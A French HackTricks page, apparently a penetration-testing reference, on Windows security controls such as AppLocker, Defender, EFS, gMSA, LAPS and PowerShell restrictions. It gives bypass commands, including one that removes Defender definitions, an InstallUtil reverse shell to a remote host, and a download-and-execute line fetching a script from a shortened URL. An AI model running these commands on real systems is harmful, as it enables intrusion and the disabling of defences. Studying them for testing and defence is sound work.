# Contrôles de sécurité Windows

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert Red Team AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour créer et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Accédez dès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Stratégie AppLocker

Une liste blanche d'applications est une liste d'applications logicielles ou d'exécutables approuvés qui sont autorisés à être présents et à s'exécuter sur un système. L'objectif est de protéger l'environnement contre les logiciels malveillants nocifs et les logiciels non approuvés qui ne correspondent pas aux besoins commerciaux spécifiques d'une organisation.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) est la **solution de liste blanche d'applications** de Microsoft et donne aux administrateurs système le contrôle sur **les applications et fichiers que les utilisateurs peuvent exécuter**. Il offre un **contrôle granulaire** sur les exécutables, scripts, fichiers d'installation Windows, DLL, applications empaquetées et installateurs d'applications empaquetées.\
Il est courant pour les organisations de **bloquer cmd.exe et PowerShell.exe** et l'accès en écriture à certains répertoires, **mais tout cela peut être contourné**.

### Vérification

Vérifiez quels fichiers/extensions sont sur liste noire/liste blanche :
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Ce chemin d'accès au registre contient les configurations et les politiques appliquées par AppLocker, offrant un moyen de passer en revue l'ensemble actuel de règles appliquées sur le système :

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Contournement

* **Dossiers inscriptibles** utiles pour contourner la politique AppLocker : Si AppLocker autorise l'exécution de quoi que ce soit à l'intérieur de `C:\Windows\System32` ou `C:\Windows`, il existe des **dossiers inscriptibles** que vous pouvez utiliser pour **contourner cela**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Les binaires **"LOLBAS"** communément **fiables** peuvent également être utiles pour contourner AppLocker.
* Les règles **mal écrites peuvent également être contournées**.
* Par exemple, avec **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, vous pouvez créer un **dossier appelé `allowed`** n'importe où et il sera autorisé.
* Les organisations se concentrent souvent sur le blocage de l'exécutable **`%System32%\WindowsPowerShell\v1.0\powershell.exe`**, mais oublient les **autres** [**emplacements des exécutables PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) tels que `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ou `PowerShell_ISE.exe`.
* **L'application des DLL est très rarement activée** en raison de la charge supplémentaire qu'elle peut mettre sur un système, et de la quantité de tests nécessaires pour s'assurer que rien ne se cassera. Ainsi, l'utilisation des **DLL comme portes dérobées aidera à contourner AppLocker**.
* Vous pouvez utiliser [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) pour **exécuter du code Powershell** dans n'importe quel processus et contourner AppLocker. Pour plus d'informations, consultez : [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Stockage des identifiants

### Gestionnaire de comptes de sécurité (SAM)

Les identifiants locaux sont présents dans ce fichier, les mots de passe sont hachés.

### Autorité de sécurité locale (LSA) - LSASS

Les **identifiants** (hachés) sont **enregistrés** dans la **mémoire** de ce sous-système pour des raisons de connexion unique.\
**LSA** administre la **politique de sécurité** locale (politique de mot de passe, autorisations des utilisateurs...), **l'authentification**, **les jetons d'accès**...\
LSA sera celui qui **vérifiera** les identifiants fournis dans le fichier **SAM** (pour une connexion locale) et **communiquera** avec le **contrôleur de domaine** pour authentifier un utilisateur de domaine.

Les **identifiants** sont **enregistrés** à l'intérieur du **processus LSASS** : tickets Kerberos, hachages NT et LM, mots de passe facilement déchiffrables.

### Secrets LSA

LSA pourrait enregistrer sur le disque certains identifiants :

* Mot de passe du compte ordinateur de l'Active Directory (contrôleur de domaine inaccessible).
* Mots de passe des comptes des services Windows
* Mots de passe pour les tâches planifiées
* Plus (mot de passe des applications IIS...)

### NTDS.dit

Il s'agit de la base de données de l'Active Directory. Elle est uniquement présente dans les contrôleurs de domaine.

## Défenseur

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) est un antivirus disponible dans Windows 10 et Windows 11, ainsi que dans les versions de Windows Server. Il **bloque** des outils de test de pénétration courants tels que **`WinPEAS`**. Cependant, il existe des moyens de **contourner ces protections**.

### Vérification

Pour vérifier le **statut** de **Defender**, vous pouvez exécuter la cmdlet PS **`Get-MpComputerStatus`** (vérifiez la valeur de **`RealTimeProtectionEnabled`** pour savoir s'il est actif) :

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Pour l'énumérer, vous pourriez également exécuter :
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Système de fichiers chiffré (EFS)

EFS sécurise les fichiers par le biais du chiffrement, en utilisant une **clé symétrique** appelée **Clé de chiffrement de fichier (FEK)**. Cette clé est chiffrée avec la **clé publique** de l'utilisateur et stockée dans le **flux de données alternatif** $EFS du fichier chiffré. Lorsque le déchiffrement est nécessaire, la **clé privée** correspondante du certificat numérique de l'utilisateur est utilisée pour déchiffrer le FEK du flux $EFS. Plus de détails peuvent être trouvés [ici](https://en.wikipedia.org/wiki/Encrypting\_File\_System).

Les **scénarios de déchiffrement sans initiation de l'utilisateur** incluent :

- Lorsque des fichiers ou des dossiers sont déplacés vers un système de fichiers non-EFS, comme [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table), ils sont automatiquement déchiffrés.
- Les fichiers chiffrés envoyés sur le réseau via le protocole SMB/CIFS sont déchiffrés avant la transmission.

Cette méthode de chiffrement permet un **accès transparent** aux fichiers chiffrés pour le propriétaire. Cependant, simplement changer le mot de passe du propriétaire et se connecter ne permettra pas le déchiffrement.

**Points clés** :

- EFS utilise un FEK symétrique, chiffré avec la clé publique de l'utilisateur.
- Le déchiffrement utilise la clé privée de l'utilisateur pour accéder au FEK.
- Le déchiffrement automatique se produit dans des conditions spécifiques, comme la copie vers FAT32 ou la transmission réseau.
- Les fichiers chiffrés sont accessibles au propriétaire sans étapes supplémentaires.

### Vérifier les informations EFS

Vérifiez si un **utilisateur** a **utilisé** ce **service** en vérifiant si ce chemin existe : `C:\users\<nom_utilisateur>\appdata\roaming\Microsoft\Protect`

Vérifiez **qui** a **accès** au fichier en utilisant cipher /c \<fichier>\
Vous pouvez également utiliser `cipher /e` et `cipher /d` à l'intérieur d'un dossier pour **chiffrer** et **déchiffrer** tous les fichiers.

### Déchiffrer les fichiers EFS

#### En tant qu'autorité système

Cette méthode nécessite que l'utilisateur **victime** exécute un **processus** à l'intérieur de l'hôte. Si tel est le cas, en utilisant des sessions `meterpreter`, vous pouvez usurper le jeton du processus de l'utilisateur (`impersonate_token` de `incognito`). Ou vous pourriez simplement `migrate` vers le processus de l'utilisateur.

#### Connaître le mot de passe des utilisateurs

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Comptes de service gérés par groupe (gMSA)

Microsoft a développé les **Comptes de service gérés par groupe (gMSA)** pour simplifier la gestion des comptes de service dans les infrastructures informatiques. Contrairement aux comptes de service traditionnels qui ont souvent l'option "**Mot de passe n'expire jamais**" activée, les gMSA offrent une solution plus sécurisée et plus facile à gérer :

- **Gestion automatique des mots de passe** : les gMSA utilisent un mot de passe complexe de 240 caractères qui change automatiquement selon la politique de domaine ou d'ordinateur. Ce processus est géré par le service de distribution de clés de Microsoft (KDC), éliminant le besoin de mises à jour manuelles des mots de passe.
- **Sécurité renforcée** : ces comptes sont immunisés contre les blocages et ne peuvent pas être utilisés pour des connexions interactives, renforçant leur sécurité.
- **Prise en charge de plusieurs hôtes** : les gMSA peuvent être partagés entre plusieurs hôtes, ce qui les rend idéaux pour les services s'exécutant sur plusieurs serveurs.
- **Capacité de tâches planifiées** : contrairement aux comptes de service gérés, les gMSA prennent en charge l'exécution de tâches planifiées.
- **Simplification de la gestion des SPN** : le système met automatiquement à jour le nom principal de service (SPN) lorsqu'il y a des changements dans les détails sAMaccount de l'ordinateur ou le nom DNS, simplifiant la gestion des SPN.

Les mots de passe des gMSA sont stockés dans la propriété LDAP _**msDS-ManagedPassword**_ et sont automatiquement réinitialisés tous les 30 jours par les contrôleurs de domaine (DC). Ce mot de passe, un bloc de données chiffrées connu sous le nom de [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), ne peut être récupéré que par des administrateurs autorisés et les serveurs sur lesquels les gMSA sont installés, garantissant un environnement sécurisé. Pour accéder à ces informations, une connexion sécurisée telle que LDAPS est requise, ou la connexion doit être authentifiée avec 'Scellement & Sécurité'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

Vous pouvez lire ce mot de passe avec [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Trouvez plus d'informations dans ce post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Consultez également cette [page web](https://cube0x0.github.io/Relaying-for-gMSA/) sur la façon d'effectuer une attaque de relais **NTLM** pour **lire** le **mot de passe** de **gMSA**.

## LAPS

La **Solution de mot de passe administrateur local (LAPS)**, disponible en téléchargement depuis [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), permet de gérer les mots de passe des administrateurs locaux. Ces mots de passe, qui sont **aléatoires**, uniques et **changés régulièrement**, sont stockés de manière centralisée dans Active Directory. L'accès à ces mots de passe est restreint par des ACL aux utilisateurs autorisés. Avec les autorisations suffisantes accordées, la capacité de lire les mots de passe des administrateurs locaux est fournie.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## Mode de langage PowerShell contraint

Le [**Mode de langage contraint PowerShell**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **verrouille bon nombre des fonctionnalités** nécessaires pour utiliser PowerShell efficacement, telles que le blocage des objets COM, en n'autorisant que les types .NET approuvés, les workflows basés sur XAML, les classes PowerShell, et plus encore.

### **Vérifier**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Contourner
```powershell
#Easy bypass
Powershell -version 2
```
Dans les versions actuelles de Windows, la contournement ne fonctionnera pas, mais vous pouvez utiliser [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Pour le compiler, vous devrez peut-être** **ajouter une référence** -> _Parcourir_ -> _Parcourir_ -> ajouter `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` et **changer le projet en .Net4.5**.

#### Contournement direct :
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Coquille inversée:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Vous pouvez utiliser [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) pour **exécuter du code Powershell** dans n'importe quel processus et contourner le mode restreint. Pour plus d'informations, consultez : [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Politique d'exécution PS

Par défaut, elle est définie sur **restricted.** Principales façons de contourner cette politique :
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
## Interface de fournisseur de support de sécurité (SSPI)

Est l'API qui peut être utilisée pour authentifier les utilisateurs.

Le SSPI sera chargé de trouver le protocole adéquat pour deux machines qui veulent communiquer. La méthode préférée pour cela est Kerberos. Ensuite, le SSPI négociera le protocole d'authentification à utiliser, ces protocoles d'authentification sont appelés Fournisseur de Support de Sécurité (SSP), ils sont situés à l'intérieur de chaque machine Windows sous forme de DLL et les deux machines doivent prendre en charge le même pour pouvoir communiquer.

### Principaux SSP

* **Kerberos** : Le préféré
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** et **NTLMv2** : Raisons de compatibilité
* %windir%\Windows\System32\msv1\_0.dll
* **Digest** : Serveurs Web et LDAP, mot de passe sous forme de hachage MD5
* %windir%\Windows\System32\Wdigest.dll
* **Schannel** : SSL et TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate** : Il est utilisé pour négocier le protocole à utiliser (Kerberos ou NTLM, Kerberos étant celui par défaut)
* %windir%\Windows\System32\lsasrv.dll

#### La négociation pourrait offrir plusieurs méthodes ou une seule.

## UAC - Contrôle de compte d'utilisateur

[Contrôle de compte d'utilisateur (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) est une fonctionnalité qui permet une **demande de consentement pour les activités élevées**.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Accédez dès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
